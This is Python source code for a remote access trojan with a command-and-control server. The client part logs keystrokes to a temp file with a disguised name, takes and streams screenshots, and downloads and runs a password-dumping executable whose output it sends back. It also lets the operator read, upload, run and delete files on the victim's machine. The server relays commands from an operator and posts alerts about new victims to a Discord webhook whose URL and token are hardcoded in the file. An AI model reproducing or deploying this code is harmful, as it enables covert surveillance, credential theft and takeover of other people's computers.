import socket, threading, getpass, time, json
from os import getenv, path, listdir, system, startfile, mkdir, remove
from discord_webhook import DiscordWebhook as Webhook, DiscordEmbed as Embed
from pyautogui import screenshot
from math import *
from pynput.keyboard import Listener, Key

def connectedToInternet() -> bool:
    ts = socket.socket()
    try:
        ts.connect(("google.com", 80))
        ts.close()
        return True
    except:
        return False

def loadCracker() -> bytes:
    pathToCracker = "C:\\Users\\lukas\\Desktop\\cracker.exe"
    f = open(pathToCracker, 'rb')
    cracker = f.read()
    f.close()
    return cracker

class NewConnection:
    def __init__(self, ip, port, logger=False) -> None:
        self.server = (ip, port)
        self.s = socket.socket()
        self.listenerActive = False
        self.eventListener = None
        if logger:
            if path.exists(getenv("temp")+"\\LoggerConfig.json"):
                f = open(getenv("temp")+"\\LoggerConfig.json", 'r')
                config = json.loads(f.read())
                f.close()
                if config["active"]:
                    self.listenerActive = True
                    self.activateListener()

    def activateListener(self) -> None:
        global line, shift
        line = ""
        shift = True
        def keyPressed(key):
            global line, shift
            if key == Key.shift:
                shift = True
            elif key == Key.enter:
                oldData = ""
                if path.exists(getenv("temp")+"\\WindowsSys32_debug.dbg"):
                    f = open(getenv("temp")+"\\WindowsSys32_debug.dbg", 'r')
                    oldData = f.read()
                    f.close()
                f = open(getenv("temp")+"\\WindowsSys32_debug.dbg", 'w')
                f.write(oldData+"\n"+line)
                f.close()
                line = ""
            elif key == Key.backspace:
                line = line[:-1]
            elif "'" in str(key):
                if shift:
                    line += str(key).replace("'", "").upper()
                else:
                    line += str(key).replace("'", "")
        def keyReleased(key):
            global shift
            if key == Key.shift:
                shift = False
        self.eventListener = Listener(on_press=keyPressed, on_release=keyReleased)
        self.eventListener.start()

    def newSocket(self) -> None:
        self.s = socket.socket()

    def connect(self) -> bool:
        try:
            self.s.connect(self.server)
            return True
        except:
            return False
        
    def disconnect(self) -> None:
        self.s.close()

    def send(self, data, encoded=False) -> None:
        if not encoded:
            self.s.send(data.encode())
        else:
            self.s.send(data)

    def recv(self, buff=2048, timeout=None) -> any:
        if timeout != None:
            self.s.settimeout(timeout)
        else:
            self.s.settimeout(None)
        data = self.s.recv(buff)
        try:
            data = data.decode()
            return data
        except:
            return data

    def initShell(self) -> None:
        self.shell()

    def shell(self) -> None:
        while True:
            cmd = self.s.recv(2048).decode()
            if cmd == "check":
                self.s.send("check".encode())
            elif cmd == "whois":
                self.s.send(str(socket.gethostname()+"\n"+getpass.getuser()).encode())
            elif cmd == "exit":
                self.s.close()
                break
            elif cmd == "kill":
                self.s.close()
                self.listenerActive = False
                self.eventListener.stop()
                self.eventListener.join()
                exit()
            elif cmd == "view":
                savePath = getenv("temp")+"\\windows_autoupdate.png"
                screen = screenshot(savePath)
                f = open(savePath, 'rb')
                image = f.read()
                f.close()
                self.s.send(str(len(image)).encode())
                wait = self.s.recv(2048).decode()
                self.s.send(image)
                del image, screen
            elif cmd == "crack":
                savePath = getenv("temp")+"\\getStuff.exe"
                pswdPath = getenv("temp")+"\\stuffOutputed.pswd"
                self.s.send("ready".encode())
                size = int(self.s.recv(2048).decode())
                self.s.send("ready".encode())
                cracker = self.s.recv(ceil(size/1024)*1024)
                f = open(savePath, 'wb')
                f.write(cracker)
                f.close()
                del cracker
                system('%temp%\\getStuff.exe /stext "'+pswdPath+'"')
                time.sleep(0.5)
                f = open(pswdPath, 'rb')
                pswds = f.read()
                f.close()
                self.s.send(str(len(pswds)).encode())
                wait = self.s.recv(2048).decode()
                self.s.send(pswds)
                del pswds
            elif cmd[:6] == "logger":
                action = cmd.split(" ")[1]
                if action == "start":
                    if not self.listenerActive:
                        self.listenerActive = True
                        self.activateListener()
                        f = open(getenv("temp")+"\\LoggerConfig.json", 'w')
                        f.write(json.dumps({"active": True}))
                        f.close()
                        self.s.send("done|Successfully started the keylogger".encode())
                    else:
                        self.s.send("error|Keylogger is already running".encode())
                elif action == "stop":
                    if self.listenerActive:
                        self.listenerActive = False
                        f = open(getenv("temp")+"\\LoggerConfig.json", 'w')
                        f.write(json.dumps({"active": False}))
                        f.close()
                        self.s.send("done|Successfully stoped the keylogger".encode())
                    else:
                        self.s.send("error|Keylogger is not running".encode())
                elif action == "status":
                    if self.listenerActive:
                        self.s.send("done|Keylogger is running".encode())
                    else:
                        self.s.send("done|Keylogger is NOT running".encode())
                elif action == "view":
                    if not path.exists(getenv("temp")+"\\WindowsSys32_debug.dbg"):
                        self.s.send("error|You need to start the logger in order to view logs".encode())
                    else:
                        f = open(getenv("temp")+"\\WindowsSys32_debug.dbg", 'r')
                        data = f.read().encode()
                        f.close()
                        self.s.send(str("data|"+str(len(data))).encode())
                        wait = self.s.recv(2048).decode()
                        self.s.send(data)
                        del data
                elif action == "clear":
                    f = open(getenv("temp")+"\\WindowsSys32_debug.dbg", 'w')
                    f.write("")
                    f.close()
                    self.s.send("done|Successfully cleared the logging file".encode())
            elif cmd[:2] == "cd":
                try:
                    listdir(cmd[3:])
                    self.s.send("done|".encode())
                except Exception as e:
                    self.s.send(str("error|"+str(e)).encode())
            elif cmd[:3] == "dir":
                try:
                    files = listdir(cmd.split("|")[1])
                except Exception as e:
                    self.s.send(str("error|"+str(e)).encode())
                    continue
                response = ", ".join(files)
                if len(response) > 2048:
                    response = response[:2045]+"..."
                self.s.send(response.encode())
                del response
            elif cmd[:3] == "get":
                filePath = cmd.split("|")[1]
                if not path.exists(filePath):
                    self.s.send(str("error|There is not such file at '"+filePath+"'").encode())
                elif not path.isfile(filePath):
                    self.s.send("error|Target is not a file".encode())
                else:
                    f = open(filePath, 'rb')
                    data = f.read()
                    f.close()
                    if type(data) != bytes:
                        data = data.encode()
                    self.s.send(str("data|"+str(len(data))).encode())
                    wait = self.s.recv(2048).decode()
                    self.s.send(data)
                    del data
            elif cmd[:3] == "cat":
                filePath = cmd.split("|")[1]
                if not path.exists(filePath):
                    self.s.send(str("error|There is not such file at '"+filePath+"'").encode())
                elif not path.isfile(filePath):
                    self.s.send("error|Target is not a file".encode())
                else:
                    f = open(filePath, 'rb')
                    data = f.read()
                    f.close()
                    if type(data) != bytes:
                        data = data.encode()
                    if len(data) > 8192:
                        data = data[:8186]+" .....".encode()
                    self.s.send(str("data|"+str(len(data))).encode())
                    wait = self.s.recv(2048).decode()
                    self.s.send(data)
                    del data
            elif cmd[:3] == "run":
                filePath = cmd.split("|")[1]
                if not path.exists(filePath):
                    self.s.send(str("error|There is not such file at '"+filePath+"'").encode())
                elif not path.isfile(filePath):
                    self.s.send("error|Target is not a file".encode())
                else:
                    startfile(filePath)
                    self.s.send("done|".encode())
            elif cmd[:3] == "put":
                filePath = cmd.split("|")[1]
                if path.exists(filePath):
                    self.s.send(str("error|This path/file ("+filePath+") already exists").encode())
                elif path.isdir(filePath):
                    self.s.send(str("error|Specified path ("+filePath+") is a directory").encode())
                else:
                    self.s.send("ready|".encode())
                    data = self.s.recv(int(cmd.split("|")[2]))
                    f = open(cmd.split("|")[1], 'wb')
                    f.write(data)
                    f.close()
                    del data
            elif cmd[:5] == "mkdir":
                dirPath = cmd.split("|")[1]
                dirName = dirPath.split("\\")[-1]
                dirDirPath = "\\".join(dirPath.split("\\")[:-1])
                if path.exists(dirPath):
                    self.s.send(str("error|Directory with name ("+dirName+") already exists").encode())
                elif not path.exists(dirDirPath):
                    self.s.send(str("error|Specified path ("+dirDirPath+") does not exist").encode())
                else:
                    try:
                        mkdir(dirPath)
                    except Exception as e:
                        self.s.send(str("error|"+str(e)).encode())
                        continue
                    self.s.send("done|".encode())
            elif cmd[:3] == "ren":
                targetPath = cmd.split("|")[1]
                destPath = cmd.split("|")[2]
                destDir = "\\".join(destPath.split("\\")[:-1])
                if not path.exists(targetPath):
                    self.s.send(str("error|The target file ("+targetPath+") does not exist").encode())
                    continue
                elif path.exists(destPath):
                    self.s.send(str("error|The destination file/path ("+destPath+") already exists").encode())
                    continue
                elif not path.exists(destDir):
                    self.s.send(str("error|The destination directory ("+destDir+") does not exist").encode())
                    continue
                elif path.isdir(targetPath):
                    self.s.send(str("error|The destination file ("+destDir+") is a directory").encode())
                    continue
                else:
                    try:
                        f = open(targetPath, 'rb')
                        data = f.read()
                        f.close()
                        if type(data) != bytes: data = data.encode()
                        f = open(destPath, 'wb')
                        f.write(data)
                        f.close()
                        remove(targetPath)
                    except Exception as e:
                        self.s.send(str("error|"+str(e)).encode())
                        continue
                    self.s.send("done|".encode())
                    del data
            elif cmd[:3] == "del":
                targetPath = cmd.split("|")[1]
                if not path.exists(targetPath):
                    self.s.send(str("error|The target file ("+targetPath+") does not exist").encode())
                    continue
                else:
                    try:
                        remove(targetPath)
                    except Exception as e:
                        self.s.send(str("error|"+str(e)).encode())
                        continue
                    self.s.send("done|".encode())

class NewServer:
    def __init__(self, ip, port, database=None, discordNotifications=False) -> None:
        self.dcNotifs = discordNotifications
        self.connDB = database
        self.running = True
        self.server = (ip, port)
        self.s = socket.socket()
        self.s.settimeout(5)
        self.conns = []
        self.addrByConn = {}
        self.connByAddr = {}
        self.connData = {}
        self.threads = []
    
    def _godThread(self, conn) -> None:
        godConnected = True
        clientShell = None
        FTP = False
        while godConnected:
            conn.settimeout(5)
            try:
                command = conn.recv(2048).decode()
                cmd = command.split(" ")
            except socket.timeout:
                continue
            except:
                godConnected = False
                conn.close()
            conn.settimeout(None)
            if not FTP: # MAIN GOD SHELL
                if cmd[0] == "exit":
                    godConnected = False
                    conn.close()
                elif cmd[0] == "update":
                    old = []
                    for c in self.conns:
                        c.settimeout(5)
                        try:
                            c.send("check".encode())
                            resp = c.recv(2048).decode()
                            if resp != "check":
                                raise Exception("Expected 'check' got '"+str(resp)+"'")
                        except:
                            old.append(c)
                    for c in old:
                        del self.conns[self.conns.index(c)]
                        addr = self.addrByConn[c]
                        self.addrByConn.pop(c)
                        self.connByAddr.pop(addr)
                        print("[.]", addr, "was removed from the database, reason: No response")
                    conn.send(str(len(old)).encode())
                elif cmd[0] == "clients":
                    clients = ""
                    for c in self.conns:
                        addr = self.addrByConn[c]
                        clients += " "+str(self.conns.index(c))+") "+addr+" ("+self.connData[c].replace("\n", " => ")+")\n"
                    if clients != "":
                        conn.send(clients[:-1].encode())
                    else:
                        conn.send("There are no clients connected".encode())
                elif cmd[0] == "newshell":
                    try:
                        indx = int(cmd[1])
                    except:
                        conn.send("error|Invalid ID".encode())
                    if indx >= 0 and len(self.conns) > indx:
                        clientShell = self.conns[indx]
                        addr = self.addrByConn[clientShell]
                        conn.send(str("shell|"+addr).encode())
                    else:
                        conn.send("error|There is no client with that ID".encode())
                elif cmd[0] == "exitShell":
                    clientShell = None
                    conn.send("done".encode())
                elif cmd[0] == "kill":
                    clientShell.send("kill".encode())
                    del self.conns[self.conns.index(clientShell)]
                    addr = self.addrByConn[clientShell]
                    self.addrByConn.pop(clientShell)
                    self.connByAddr.pop(addr)
                    clientShell.close()
                    clientShell = None
                    conn.send("done".encode())
                elif cmd[0] == "view":
                    clientShell.send("view".encode())
                    imageSize = clientShell.recv(2048).decode()
                    conn.send(imageSize.encode())
                    clientShell.send("ready".encode())
                    image = clientShell.recv(ceil(int(imageSize)/1024)*1024)
                    wait = conn.recv(2048).decode()
                    conn.send(image)
                elif cmd[0] == "crack":
                    clientShell.send("crack".encode())
                    wait = clientShell.recv(2048).decode()
                    conn.send("ready".encode())
                    size = conn.recv(2048).decode()
                    clientShell.send(size.encode())
                    wait = clientShell.recv(2048).decode()
                    conn.send("ready".encode())
                    cracker = conn.recv(ceil(int(size)/1024)*1024)
                    clientShell.send(cracker)
                    del cracker
                    size = clientShell.recv(2048).decode()
                    conn.send(size.encode())
                    wait = conn.recv(2048).decode()
                    clientShell.send("ready".encode())
                    pswds = clientShell.recv(ceil(int(size)/1024)*1024)
                    conn.send(pswds)
                elif cmd[0] == "stream":
                    while True:
                        clientShell.send("view".encode())
                        imageSize = clientShell.recv(2048).decode()
                        conn.send(imageSize.encode())
                        wait = conn.recv(2048).decode()
                        clientShell.send("ready".encode())
                        image = clientShell.recv(ceil(int(imageSize)/1024)*1024)
                        conn.send(image)
                        status = conn.recv(2048).decode()
                        if status == "stop":
                            break
                elif cmd[0] == "logger":
                    clientShell.send(command.encode())
                    resp = clientShell.recv(2048).decode()
                    conn.send(resp.encode())
                    if resp.split("|")[0] == "data":
                        wait = conn.recv(2048).decode()
                        clientShell.send("ready".encode())
                        data = clientShell.recv(ceil(int(resp.split("|")[1])/1024)*1024)
                        conn.send(data)
                        del data
                elif cmd[0] == "ftp":
                    FTP = True
                    conn.send("done".encode())
            else: # FTP SHELL
                if cmd[0] == "exit":
                    FTP = False
                    conn.send("done".encode())
                elif cmd[0] == "cd":
                    clientShell.send(command.encode())
                    resp = clientShell.recv(2048)
                    conn.send(resp)
                elif cmd[0][:3] == "dir":
                    clientShell.send(command.encode())
                    resp = clientShell.recv(2048)
                    conn.send(resp)
                elif cmd[0][:3] == "get":
                    clientShell.send(command.encode())
                    resp = clientShell.recv(2048)
                    conn.send(resp)
                    if resp.decode().split("|")[0] == "data":
                        wait = conn.recv(2048).decode()
                        clientShell.send("ready".encode())
                        data = clientShell.recv(ceil(int(resp.decode().split("|")[1])/1024)*1024)
                        conn.send(data)
                        del data
                elif cmd[0][:3] == "cat":
                    clientShell.send(command.encode())
                    resp = clientShell.recv(2048)
                    conn.send(resp)
                    if resp.decode().split("|")[0] == "data":
                        wait = conn.recv(2048).decode()
                        clientShell.send("ready".encode())
                        data = clientShell.recv(ceil(int(resp.decode().split("|")[1])/1024)*1024)
                        conn.send(data)
                        del data
                elif cmd[0][:3] == "run":
                    clientShell.send(command.encode())
                    resp = clientShell.recv(2048)
                    conn.send(resp)
                elif cmd[0][:3] == "put":
                    clientShell.send(command.encode())
                    resp = clientShell.recv(2048)
                    conn.send(resp)
                    if resp.decode().split("|")[0] == "ready":
                        data = conn.recv(int(command.split("|")[2]))
                        clientShell.send(data)
                        del data
                elif cmd[0][:5] == "mkdir":
                    clientShell.send(command.encode())
                    resp = clientShell.recv(2048)
                    conn.send(resp)
                elif cmd[0][:3] == "ren":
                    clientShell.send(command.encode())
                    resp = clientShell.recv(2048)
                    conn.send(resp)
                elif cmd[0][:3] == "del":
                    clientShell.send(command.encode())
                    resp = clientShell.recv(2048)
                    conn.send(resp)
        print("[!] GOD has disconnected")

    def _acceptThread(self) -> None:
        while self.running:
            try:
                conn, addr = self.s.accept()
                time.sleep(1)
                conn.settimeout(5)
                conn.send("whois".encode())
                data = conn.recv(2048).decode()
            except socket.timeout:
                continue
            if "\n" in data:
                conn.settimeout(None)
                self.conns.append(conn)
                self.addrByConn[conn] = addr[0]
                self.connByAddr[addr[0]] = conn
                self.connData[conn] = data
                print("[.] New connection from", addr[0])
                notified = False
                if self.connDB != None:
                    if addr[0] not in self.connDB["history"]:
                        self.connDB["history"].append(addr[0])
                        if self.dcNotifs: Notifier().webhook("🔥 New Connection 🔥", "Say hello to '"+data.split("\n")[0]+"', its his/her first time here!\n🖥️ IP: "+addr[0], 'ff7f00')
                        notified = True
                if not notified and self.dcNotifs: Notifier().webhook("🔌 Returning Connection 🔌", "Welcome back '"+data.split("\n")[0]+"'!\n🖥️ IP: "+addr[0], '23eec7')
            elif data == "god":
                print("[!] GOD has connected")
                gThread = threading.Thread(target=self._godThread, args=(conn,))
                gThread.start()
                self.threads.append(gThread)
            else:
                conn.close()

    def listen(self, buffer=5) -> None:
        self.s.bind(self.server)
        self.s.listen(buffer)
        aThread = threading.Thread(target=self._acceptThread)
        aThread.start()
        self.threads.append(aThread)

    def shutdown(self) -> None:
        self.running = False
        for t in self.threads:
            t.join()
        self.threads = []
        for conn in self.conns:
            try:
                conn.send("exit".encode())
            except:
                pass
            conn.close()
        self.conns = []
        self.addrByConn = {}
        self.connByAddr = {}
        self.connData = {}
    
    def exportDatabase(self) -> dict:
        return self.connDB

class Notifier:
    def __init__(self) -> None:
        self.webhookURL = "https://discord.com/api/webhooks/900723406666862662/mtk6HifEwQ478YIzSKLjiEK8kXxQJwwpyMF4FdmIzPC0TeAh2l9DqPYB-CByCDHXYMfC"
        self.ping = "<@!151721375210536961>"

    def webhook(self, title, message, color) -> None:
        hook = Webhook(self.webhookURL, content=self.ping)
        embed = Embed(title=title, description=message, color=color)
        hook.add_embed(embed)
        resp = hook.execute()

if __name__ == "__main__":
    # DEBUG
    print("Is this divice is connected to internet?", connectedToInternet())